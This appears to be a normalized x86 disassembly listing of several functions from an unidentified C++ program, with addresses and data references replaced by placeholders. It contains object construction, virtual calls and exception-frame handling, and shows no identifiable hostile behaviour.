lea ecx [ esp + 0x28 ]
push ecx
lea ecx [ esp + 0x48 ]
mov [ esp + 0xac ] 0xb
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x84 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0xa8 ] 0xc
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
lea esi [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
call sub_40f2d4
mov edi [ esp + 0x24 ]
push [ esp + 0x18 ]
mov [ esp + 0x14 ] eax
mov eax [ edi + 0xc ]
mov esi [ eax ]
mov eax [ ebx ]
mov ecx ebx
add esi 0x1c
call [ eax + 0x7c ]
mov ecx [ edi + 0xc ]
push eax
push [ esp + 0x28 ]
mov eax [ esp + 0x1c ]
push [ eax + 0x1c ]
call [ esi ]
jmp r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
lea eax [ esp + 0x80 ]
push eax
call sub_403fa5
push edi
push 0x1
lea ecx [ esp + 0x4c ]
call sub_40415f
push edi
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0xb0 ] 0x1
call sub_40415f
push r--data
lea eax [ esp + 0x80 ]
push eax
call sub_403fa5
push r--data
lea ecx [ esp + 0x2c ]
call sub_403dc1
lea esi [ esp + 0x10 ]
mov [ esp + 0xa8 ] 0x4
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ esp + 0x28 ]
push edx
lea edx [ esp + 0x48 ]
push edx
call [ eax + 0x40 ]
mov [ esp + 0xa8 ] 0x5
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push edi
lea ecx [ esp + 0x2c ]
call sub_403dc1
lea ecx [ esp + 0x28 ]
push ecx
lea ecx [ esp + 0x48 ]
mov [ esp + 0xac ] 0xf
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x84 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0xa8 ] 0x10
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
push [ esp + 0x10 ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0xc ]
mov edi [ eax ]
mov eax [ ebx ]
mov ecx ebx
add edi 0x20
call [ eax + 0x7c ]
mov ecx [ esi + 0xc ]
push eax
push [ esp + 0x20 ]
push [ esi + 0x38 ]
call [ edi ]
cmp [ esi + 0xc ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esp + 0x30 ]
call sub_40415f
jmp r-xdata
mov eax [ esp + 0x74 ]
mov ecx [ esp + 0x60 ]
push eax
push ecx
lea eax [ esp + 0x84 ]
push eax
lea edi [ esp + 0x6c ]
call sub_4041aa
push 0x0
push 0x1
lea ecx [ esp + 0x84 ]
mov [ esp + 0xb0 ] 0x0
call sub_40415f
mov edi [ esp + 0x20 ]
push r--data
lea eax [ esp + 0x80 ]
push eax
call sub_403fa5
push edi
lea ecx [ esp + 0x2c ]
call sub_403dc1
lea esi [ esp + 0x10 ]
mov [ esp + 0xa8 ] 0x7
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ esp + 0x28 ]
push edx
lea edx [ esp + 0x48 ]
push edx
call [ eax + 0x40 ]
mov [ esp + 0xa8 ] 0x8
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push eax
lea eax [ esp + 0x80 ]
push eax
call sub_403fa5
push edi
push 0x1
lea ecx [ esp + 0x4c ]
call sub_40415f
push edi
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0xb0 ] 0x1
call sub_40415f
mov edi r--data
push edi
lea ecx [ esp + 0x2c ]
call sub_403dc1
lea esi [ esp + 0x10 ]
mov [ esp + 0xa8 ] 0x6
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ esp + 0x28 ]
push edx
lea edx [ esp + 0x48 ]
push edx
call [ eax + 0x40 ]
mov esi [ eax + 0x14 ]
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0xb0 ] 0x1
call sub_40415f
test esi esi
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
lea eax [ esp + 0x80 ]
push eax
call sub_403fa5
push 0x0
push 0x1
lea ecx [ esp + 0x4c ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0xb0 ] 0x1
call sub_40415f
sub_41af43
push 0xe0
mov eax sub_43f101
call sub_425e16
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x2c ]
xor ebx ebx
push ecx
mov [ ebp - 0x30 ] ebx
push [ eax + 0x34 ]
mov [ ebp - 0x5c ] eax
call sub_40d136
mov esi 0x80
push esi
mov [ ebp - 0x4 ] ebx
call sub_4246c6
pop ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor edi edi
mov [ ebp - 0x38 ] ebx
inc edi
push r--data
lea ecx [ ebp - 0xec ]
call sub_403dc1
xor edi edi
mov [ ebp - 0x4 ] 0x2
inc edi
push r--data
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0x30 ] edi
call sub_403dc1
push 0x3
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] eax
push ebx
lea eax [ ebp - 0xec ]
push eax
lea eax [ ebp - 0xb4 ]
push eax
push [ ebp - 0x34 ]
call sub_41ec78
mov [ ebp - 0x38 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
push ebx
push edi
lea ecx [ ebp - 0xb4 ]
call sub_40415f
test [ ebp - 0x30 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
mov ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x54 ]
push edx
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x7
mov eax [ ecx ]
push edx
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x7c ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
lea ecx [ ebp - 0x54 ]
call sub_403dc1
mov ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x2c ]
push edx
lea edx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x8
mov eax [ ecx ]
push edx
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push esi
call sub_4246c6
pop ecx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x9
cmp eax ebx
je r-xdata
and [ ebp - 0x30 ] 0xfffffffe
push ebx
push edi
lea ecx [ ebp - 0xec ]
call sub_40415f
mov [ ebp - 0x34 ] ebx
push r--data
lea ecx [ ebp - 0x7c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xa
or [ ebp - 0x30 ] 0x4
push r--data
lea ecx [ ebp - 0x54 ]
call sub_403dc1
mov edi [ ebp - 0x38 ]
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0xb
or [ ebp - 0x30 ] 0x8
push eax
push [ ebp - 0x34 ]
xor bl bl
call sub_41ed6b
xor edi edi
xor ebx ebx
mov [ ebp - 0x34 ] eax
inc edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x4
je r-xdata
and [ ebp - 0x30 ] 0xfffffff7
push ebx
push edi
lea ecx [ ebp - 0x54 ]
call sub_40415f
test [ ebp - 0x30 ] 0x8
je r-xdata
push r--data
lea ecx [ ebp - 0x98 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xe
mov ecx [ ebp - 0x34 ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp - 0x98 ]
push edx
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push esi
call sub_4246c6
pop ecx
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x4 ] 0xf
cmp eax ebx
je r-xdata
and [ ebp - 0x30 ] 0xfffffffb
push ebx
push edi
lea ecx [ ebp - 0x7c ]
call sub_40415f
xor esi esi
push r--data
lea ecx [ ebp - 0xd0 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x10
or [ ebp - 0x30 ] 0x10
push r--data
lea ecx [ ebp - 0x98 ]
call sub_403dc1
lea eax [ ebp - 0xd0 ]
push eax
lea eax [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x11
mov edi [ ebp - 0x34 ]
or [ ebp - 0x30 ] 0x20
push eax
push [ ebp - 0x60 ]
xor bl bl
call sub_41ed6b
xor edi edi
xor ebx ebx
mov esi eax
inc edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test [ ebp - 0x30 ] 0x10
je r-xdata
and [ ebp - 0x30 ] 0xffffffdf
push ebx
push edi
lea ecx [ ebp - 0x98 ]
call sub_40415f
test [ ebp - 0x30 ] 0x20
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_403dc1
mov ecx [ ebp - 0x58 ]
add ecx 0x70
push ecx
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x14
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push r--data
lea ecx [ ebp - 0x7c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x15
call sub_403dc1
lea ecx [ ebp - 0x7c ]
push ecx
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x16
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push edi
lea ecx [ ebp - 0x54 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] bl
call sub_40415f
mov eax [ ebp - 0x5c ]
mov ecx [ eax + 0x34 ]
push [ ebp - 0x38 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_40415f
call sub_425e60
retn 0x4
push ebx
push edi
lea ecx [ ebp - 0xd0 ]
call sub_40415f
sub_41b277
push ebp
sub esp 0x58
push 0x38
mov eax sub_43bb0c
call sub_425dad
xor edi edi
push 0x80
mov [ ebp + 0x58 ] edi
call sub_4246c6
pop ecx
mov [ ebp + 0x54 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor esi esi
push r--data
lea ecx [ ebp ]
call sub_403dc1
mov [ ebp - 0x4 ] bl
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp + 0x58 ] ebx
call sub_403dc1
push edi
lea eax [ ebp ]
push eax
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp + 0x54 ]
mov [ ebp + 0x58 ] 0x3
call sub_41ec78
mov esi eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x58 ] bl
je r-xdata
and [ ebp + 0x58 ] 0xfffffffd
push edi
push ebx
lea ecx [ ebp - 0x28 ]
call sub_40415f
test [ ebp + 0x58 ] 0x2
je r-xdata
cmp [ ebp + 0x6c ] 0x0
je r-xdata
push edi
push ebx
lea ecx [ ebp ]
call sub_40415f
push r--data
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push r--data
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
lea ecx [ ebp + 0x1c ]
push ecx
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x8
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push edi
push ebx
lea ecx [ ebp + 0x38 ]
call sub_40415f
lea ecx [ ebp + 0x1c ]
push r--data
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_403dc1
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x6
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push edi
push ebx
lea ecx [ ebp + 0x1c ]
call sub_40415f
lea ecx [ ebp + 0x38 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
call sub_40415f
push r--data
lea ecx [ ebp - 0x44 ]
call sub_403dc1
mov ecx [ ebp + 0x68 ]
add ecx 0x70
push ecx
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x9
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp - 0x44 ]
call sub_40415f
mov eax [ ebp + 0x64 ]
mov ecx [ eax + 0x34 ]
mov eax [ ecx ]
push esi
call [ eax + 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x5c
leave
retn 0xc
sub_41b3fa
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43f575
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1b0
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1c0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
mov [ esp + 0x10 ] ebx
cmp [ esi + 0x8 ] ebx
je r-xdata
mov ecx [ esp + 0x1c0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x68 ]
cmp eax 0x100
je r-xdata
push r--data
lea ecx [ esp + 0x70 ]
call sub_403dc1
lea ecx [ esp + 0x6c ]
push ecx
lea ecx [ esp + 0xfc ]
mov [ esp + 0x1cc ] ebx
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x84 ]
mov [ esp + 0x1c8 ] 0x1
mov ecx [ esi + 0x8 ]
mov ebx [ ecx ]
push eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov ecx [ esi + 0x8 ]
push eax
call [ ebx + 0x24 ]
push 0x0
push 0x1
lea ecx [ esp + 0x100 ]
mov [ esp + 0x1c ] al
call sub_40415f
or [ esp + 0x1c8 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x74 ]
call sub_40415f
cmp [ esi + 0x54 ] 0x0
je r-xdata
cmp eax 0x200
je r-xdata
push [ esp + 0x14 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
push eax
add esi 0xfffffff8
push esi
call sub_41b277
mov eax [ esi + 0x8 ]
mov ebx [ eax ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov ecx [ esi + 0x8 ]
push eax
call [ ebx + 0x8 ]
jmp r-xdata
cmp eax 0x400
je r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c8 ] 0x2
cmp eax ebx
je r-xdata
cmp eax 0x800
jne r-xdata
test [ esp + 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ esp + 0x54 ]
call sub_403dc1
mov [ esp + 0x1c8 ] 0x3
push r--data
lea ecx [ esp + 0x8c ]
mov [ esp + 0x14 ] 0x1
call sub_403dc1
push ebx
lea eax [ esp + 0x54 ]
push eax
lea eax [ esp + 0x90 ]
mov [ esp + 0x1d0 ] 0x4
push eax
push [ esp + 0x20 ]
mov [ esp + 0x20 ] 0x3
call sub_41ec78
mov ebx eax
mov eax [ esi + 0x8 ]
mov ebx [ eax ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov ecx [ esi + 0x8 ]
push eax
call [ ebx + 0x14 ]
jmp r-xdata
or [ esp + 0x1c8 ] 0xffffffff
test [ esp + 0x10 ] 0x1
je r-xdata
and [ esp + 0x10 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ esp + 0x90 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x1c ]
call sub_403dc1
push r--data
lea ecx [ esp + 0xa8 ]
mov [ esp + 0x1cc ] 0x7
call sub_403dc1
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0xa8 ]
mov [ esp + 0x1cc ] 0x8
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ esp + 0xac ]
call sub_40415f
or [ esp + 0x1c8 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x20 ]
call sub_40415f
push r--data
lea ecx [ esp + 0xc4 ]
call sub_403dc1
mov [ esp + 0x1c8 ] 0x9
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov edx [ ebx ]
add eax 0x70
push eax
lea eax [ esp + 0xc4 ]
push eax
mov ecx ebx
call [ edx + 0x10 ]
or [ esp + 0x1c8 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0xc8 ]
call sub_40415f
mov ecx [ esi + 0x2c ]
mov eax [ ecx ]
push ebx
call [ eax + 0x14 ]
push r--data
lea ecx [ esp + 0x38 ]
call sub_403dc1
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0xe0 ]
mov [ esp + 0x1cc ] 0xa
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x84 ]
mov [ esp + 0x1c8 ] 0xb
mov ecx [ esi + 0x8 ]
mov ebx [ ecx ]
push eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov ecx [ esi + 0x8 ]
push eax
call [ ebx + 0x28 ]
push 0x0
push 0x1
lea ecx [ esp + 0xe4 ]
mov bl al
call sub_40415f
or [ esp + 0x1c8 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x3c ]
call sub_40415f
cmp [ esi + 0x54 ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ esp + 0x58 ]
call sub_40415f
test bl bl
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
add eax 0x70
push eax
lea eax [ esp + 0x118 ]
push eax
call sub_401152
add esi 0xfffffff8
push esi
lea ecx [ esp + 0x118 ]
mov [ esp + 0x1cc ] 0xc
call sub_41af43
lea esi [ esp + 0x114 ]
call sub_4011ad
jmp r-xdata
sub_41b77f
push 0x23c
mov eax sub_43ccae
call sub_425e16
mov eax [ ebp + 0x8 ]
mov esi ecx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x158 ] eax
call sub_403dc1
lea ecx [ ebp - 0x2c ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x4c ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov esi eax
call sub_40415f
mov eax [ esi ]
mov ecx esi
call [ eax + 0x3c ]
mov edi eax
mov eax [ edi + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x150 ] eax
mov eax [ edi ]
mov [ ebp - 0x164 ] edi
mov [ ebp - 0x154 ] eax
call sub_423d5c
cmp [ ebp - 0x154 ] eax
je r-xdata
call sub_425e60
retn 0x8
lea esi [ ebp - 0x154 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x150 ] esi
je r-xdata
lea esi [ ebp - 0x154 ]
call sub_408d54
jmp r-xdata
lea eax [ ebp - 0x1d0 ]
push eax
call sub_403eef
xor edi edi
mov esi r--data
inc edi
push esi
lea ecx [ ebp - 0x190 ]
mov [ ebp - 0x4 ] edi
call sub_403dc1
push esi
lea ecx [ ebp - 0x1b4 ]
mov [ ebp - 0x4 ] 0x2
call sub_403dc1
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x3
call sub_403dc1
lea esi [ ebp - 0x154 ]
mov [ ebp - 0x4 ] 0x4
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x190 ]
push edx
lea edx [ ebp - 0x1b4 ]
push edx
lea edx [ ebp - 0x2c ]
push edx
call [ eax + 0x50 ]
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x149 ] al
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x1b4 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x190 ]
mov [ ebp - 0x4 ] 0x1
call sub_40415f
cmp [ ebp - 0x149 ] bl
je r-xdata
mov esi [ edi + 0x14 ]
mov eax [ edi ]
cmp [ ebp - 0x154 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x190 ]
call sub_403dc1
lea esi [ ebp - 0x154 ]
mov [ ebp - 0x4 ] 0x5
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x190 ]
push edx
lea edx [ ebp - 0x210 ]
push edx
call [ eax + 0x40 ]
push eax
lea eax [ ebp - 0x148 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_401152
push ebx
push edi
lea ecx [ ebp - 0x210 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x190 ]
mov [ ebp - 0x4 ] 0x9
call sub_40415f
mov esi [ ebp - 0x158 ]
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x160 ]
push eax
add esi 0x14
push esi
call sub_41bf50
mov eax [ esi + 0x18 ]
mov [ ebp - 0x194 ] eax
mov eax [ esi ]
lea edi [ ebp - 0x198 ]
lea esi [ ebp - 0x160 ]
mov [ ebp - 0x198 ] eax
call sub_40f543
test al al
jne r-xdata
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x3c ]
mov edi eax
mov eax [ edi + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x168 ] eax
mov eax [ edi ]
mov [ ebp - 0x16c ] eax
push r--data
lea ecx [ ebp - 0x48 ]
call sub_403dc1
lea esi [ ebp - 0x154 ]
mov [ ebp - 0x4 ] 0x12
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x64 ]
push edx
call [ eax + 0x40 ]
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x14
call sub_40415f
push r--data
lea eax [ ebp - 0x64 ]
call sub_40563c
pop ecx
test al al
jne r-xdata
push r--data
lea ecx [ ebp - 0x1b4 ]
call sub_403dc1
lea esi [ ebp - 0x154 ]
mov [ ebp - 0x4 ] 0xa
call sub_40f2a9
mov edi [ eax ]
lea esi [ ebp - 0x160 ]
call sub_40f2d4
mov esi [ eax + 0x1c ]
mov eax [ edi ]
lea ecx [ ebp - 0x1b4 ]
push ecx
lea ecx [ ebp - 0x248 ]
push ecx
mov ecx edi
call [ eax + 0x40 ]
mov [ ebp - 0x4 ] 0xb
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x4 ]
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0x248 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x1b4 ]
mov [ ebp - 0x4 ] 0x9
call sub_40415f
push r--data
lea ecx [ ebp - 0x1b4 ]
call sub_403dc1
lea esi [ ebp - 0x154 ]
mov [ ebp - 0x4 ] 0xc
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x1b4 ]
push edx
lea edx [ ebp - 0x2c ]
push edx
call [ eax + 0x40 ]
push ebx
push edi
lea ecx [ ebp - 0x1b4 ]
mov [ ebp - 0x4 ] 0xe
call sub_40415f
push r--data
lea eax [ ebp - 0x2c ]
call sub_40563c
pop ecx
test al al
je r-xdata
call sub_423d5c
cmp [ ebp - 0x16c ] eax
je r-xdata
lea ecx [ ebp - 0x64 ]
push r--data
lea ecx [ ebp - 0x190 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x15
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x190 ]
push edx
lea edx [ ebp - 0x80 ]
push edx
call [ eax + 0x40 ]
push ebx
push edi
lea ecx [ ebp - 0x190 ]
mov [ ebp - 0x4 ] 0x17
call sub_40415f
push r--data
lea ecx [ ebp - 0x1f4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x18
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x1f4 ]
push edx
lea edx [ ebp - 0x9c ]
push edx
call [ eax + 0x40 ]
push ebx
push edi
lea ecx [ ebp - 0x1f4 ]
mov [ ebp - 0x4 ] 0x1a
call sub_40415f
mov [ ebp - 0x170 ] bl
cmp [ ebp - 0x88 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x190 ]
call sub_403dc1
lea esi [ ebp - 0x154 ]
mov [ ebp - 0x4 ] 0xf
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x190 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
call [ eax + 0x40 ]
push ebx
push edi
lea ecx [ ebp - 0x190 ]
mov [ ebp - 0x4 ] 0x11
call sub_40415f
mov [ ebp - 0x174 ] bl
cmp [ ebp - 0x34 ] ebx
je r-xdata
lea esi [ ebp - 0x160 ]
call sub_40f2d4
mov eax [ eax + 0x1c ]
cmp eax ebx
je r-xdata
xor edi edi
inc edi
lea esi [ ebp - 0x16c ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
call [ eax + 0x2c ]
push eax
lea eax [ ebp - 0x1d0 ]
call sub_403f8c
call sub_408d54
jmp r-xdata
cmp [ ebp - 0x168 ] esi
je r-xdata
lea eax [ ebp - 0x22c ]
push eax
call sub_403eef
push [ ebp - 0x170 ]
mov esi [ ebp - 0x158 ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0xd8 ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1b
call sub_41bd67
cmp [ ebp + 0xc ] bl
je r-xdata
mov [ ebp - 0x170 ] 0x1
lea esi [ ebp - 0x160 ]
call sub_40f2d4
push [ ebp - 0x174 ]
mov ecx [ eax + 0x1c ]
mov eax [ ecx ]
lea edx [ ebp - 0x2c ]
push edx
call [ eax + 0x38 ]
call sub_40f2d4
mov ecx [ eax + 0x1c ]
mov eax [ ecx ]
lea edx [ ebp - 0x1d0 ]
push edx
call [ eax + 0x14 ]
call sub_40f2d4
mov ecx [ eax + 0x1c ]
mov eax [ ecx ]
call [ eax + 0x3c ]
cmp [ ebp + 0xc ] bl
je r-xdata
mov [ ebp - 0x174 ] 0x1
push [ ebp - 0x15c ]
lea eax [ ebp - 0x1d8 ]
push [ ebp - 0x160 ]
push eax
mov eax [ ebp - 0x158 ]
add eax 0x14
push eax
call sub_40fc47
mov eax [ ebp - 0x158 ]
cmp [ eax + 0x10 ] ebx
je r-xdata
mov edx [ eax ]
push edi
mov ecx eax
call [ edx ]
mov esi [ edi + 0x14 ]
mov eax [ edi ]
cmp [ ebp - 0x16c ] ebx
je r-xdata
lea eax [ ebp - 0x22c ]
call sub_403f2c
push ebx
push edi
lea ecx [ ebp - 0x9c ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x80 ]
call sub_40415f
cmp [ esi + 0x10 ] ebx
je r-xdata
push ebx
push edi
lea ecx [ ebp - 0x48 ]
call sub_40415f
jmp r-xdata
mov eax [ ebp - 0x158 ]
cmp [ eax + 0x10 ] ebx
je r-xdata
lea ecx [ ebp - 0x2c ]
jmp r-xdata
mov eax [ eax + 0x10 ]
mov edx [ eax ]
lea ecx [ ebp - 0x148 ]
push ecx
mov ecx eax
call [ edx + 0xc ]
mov ecx [ esi + 0x10 ]
mov eax [ ecx ]
lea edx [ ebp - 0x148 ]
push edx
call [ eax + 0x4 ]
mov ecx [ eax + 0x10 ]
mov eax [ ecx ]
lea edx [ ebp - 0x148 ]
push edx
call [ eax + 0x10 ]
push ebx
push edi
call sub_40415f
lea esi [ ebp - 0x148 ]
call sub_4011ad
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x1d0 ]
call sub_403f2c
mov edi [ ebp - 0x164 ]
sub_41bd67
push 0xc0
mov eax sub_43cbbe
call sub_425dad
and [ ebp - 0x14 ] 0x0
push [ ebp + 0x8 ]
mov ebx ecx
mov eax [ ebx + 0x2c ]
add ebx 0x14
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x24 ]
push eax
push ebx
call sub_41bf50
lea edi [ ebp - 0x1c ]
mov esi eax
call sub_40f543
test al al
je r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_41be6f
push [ ebp + 0x18 ]
mov ecx [ eax ]
push [ ebp + 0x14 ]
mov eax [ ecx ]
call [ eax + 0x38 ]
push [ ebp + 0x8 ]
push ebx
